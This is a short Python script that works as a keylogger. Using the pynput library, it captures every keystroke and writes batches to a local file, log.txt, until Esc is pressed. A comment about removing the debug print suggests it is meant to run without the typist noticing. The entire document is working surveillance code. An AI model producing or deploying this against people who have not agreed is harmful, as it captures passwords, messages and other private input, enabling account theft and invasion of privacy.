import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    # Don't forgive to erase print
    # print('{0} pressed'.format(key))

    if count >= 4:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False
    
def write_file(keys):
    # Don't forgive to change the path or put in 'w' or 'a' 
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")

            if k.find("space") > 0:
                f.write(' ')
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()